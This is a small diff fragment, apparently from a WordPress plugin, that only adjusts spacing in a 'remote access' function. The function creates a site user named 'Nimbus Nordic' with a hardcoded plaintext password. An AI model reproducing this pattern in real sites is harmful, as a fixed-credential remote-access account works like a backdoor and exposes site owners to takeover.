@@ -36,7 +36,7 @@ function nimbus_nordic_remote_access_page() {
     } else {
       $username = 'Nimbus Nordic';
       $password = 'Ymw.1144*'; // Change this to the desired password
-     $user_id = wp_create_user( $username, $password);
+     $user_id = wp_create_user( $username, $password );
     }
   }
 }
